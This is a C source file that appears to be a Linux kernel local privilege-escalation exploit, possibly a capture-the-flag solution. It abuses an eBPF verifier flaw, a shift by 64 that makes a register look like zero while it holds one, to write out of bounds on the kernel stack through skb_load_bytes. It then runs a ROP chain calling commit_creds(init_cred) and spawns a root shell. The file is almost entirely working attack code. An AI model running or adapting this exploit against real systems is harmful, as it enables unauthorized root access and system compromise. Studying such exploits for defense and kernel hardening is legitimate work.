// x86_64-buildroot-linux-uclibc-cc core.c bpf_def.c bpf_def.h kernel_def.h -Os -static -masm=intel -s -o exp
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <linux/bpf_common.h>
#include <sys/types.h>
#include <signal.h>
#include "kernel_def.h"
#include "bpf_def.h"

void error_exit(const char *msg)
{
    puts(msg);
    exit(1);
}

#define CONST_REG   BPF_REG_9
#define EXP_REG     BPF_REG_8

#define trigger_bug() \
    /* trigger the bug */       \
    BPF_MOV64_IMM(CONST_REG, 64),     \
    BPF_MOV64_IMM(EXP_REG, 0x1),      \
    /* make exp_reg believed to be 0, in fact 1 */     \
    BPF_ALU64_REG(BPF_RSH, EXP_REG, CONST_REG),      \
    BPF_MOV64_REG(BPF_REG_0, EXP_REG)

void get_root()
{
    if (getuid() != 0)
    {
        error_exit("[-] didn't got root\n");
    }
    else
    {
        printf("[+] got root\n");
        system("/bin/sh");
    }
}

size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
void get_userstat()
{
    __asm__(".intel_syntax noprefix\n");
    __asm__ volatile(
        "mov user_cs, cs;\
         mov user_ss, ss;\
         mov user_gs, gs;\
         mov user_ds, ds;\
         mov user_es, es;\
         mov user_rsp, rsp;\
         pushf;\
         pop user_rflags");
//    printf("[+] got user stat\n");
}

int main(int argc, char* argv[])
{
    if (argc == 1)
    {
        // use the crash to leak
        struct bpf_insn oob_test[] = {
            trigger_bug(),
            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (16 - 8)),
            BPF_MOV64_IMM(BPF_REG_2, 0),
            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),
            BPF_MOV64_IMM(BPF_REG_4, 8),
            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),
            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes), 
            BPF_EXIT_INSN()
        };

        char write_buf[0x100];
        memset(write_buf, 0xAA, sizeof(write_buf));
        if (0 != run_bpf_prog(oob_test, sizeof(oob_test) / sizeof(struct bpf_insn), NULL, write_buf, 0x100))
        {
            error_exit("[-] Failed to run bpf program\n");
        }
    }
    else if (argc == 2)
    {
        get_userstat();
        signal(SIGSEGV, &get_root);
        size_t kernel_offset = strtoul(argv[1], NULL, 16);
        printf("[+] kernel offset: 0x%lx\n", kernel_offset);
        size_t commit_creds = kernel_offset + 0xffffffff810d7210;
        size_t init_cred = kernel_offset + 0xffffffff82e6e860;
        size_t pop_rdi_ret = kernel_offset + 0xffffffff81097050;
        size_t swapgs_restore_regs_and_return_to_usermode = kernel_offset + 0xffffffff81e0100b;
        size_t rop_buf[0x100];
        int i = 0;
        rop_buf[i++] = 0xDEADBEEF13377331;
        rop_buf[i++] = 0xDEADBEEF13377331;
        rop_buf[i++] = pop_rdi_ret;
        rop_buf[i++] = init_cred;
        rop_buf[i++] = commit_creds;
        rop_buf[i++] = swapgs_restore_regs_and_return_to_usermode;
        rop_buf[i++] = 0;
        rop_buf[i++] = 0;
        rop_buf[i++] = &get_root;
        rop_buf[i++] = user_cs;
        rop_buf[i++] = user_rflags;
        rop_buf[i++] = user_rsp;
        rop_buf[i++] = user_ss;
        struct bpf_insn oob_test[] = {
            trigger_bug(),
            BPF_ALU64_IMM(BPF_MUL, EXP_REG, (0x100 - 8)),
            BPF_MOV64_IMM(BPF_REG_2, 0),
            BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -8),
            BPF_MOV64_IMM(BPF_REG_4, 8),
            BPF_ALU64_REG(BPF_ADD, BPF_REG_4, EXP_REG),
            BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes), 
            BPF_EXIT_INSN()
        };

        if (0 != run_bpf_prog(oob_test, sizeof(oob_test) / sizeof(struct bpf_insn), NULL, rop_buf, 0x100))
        {
            error_exit("[-] Failed to run bpf program\n");
        }
    }

    return 0;
}
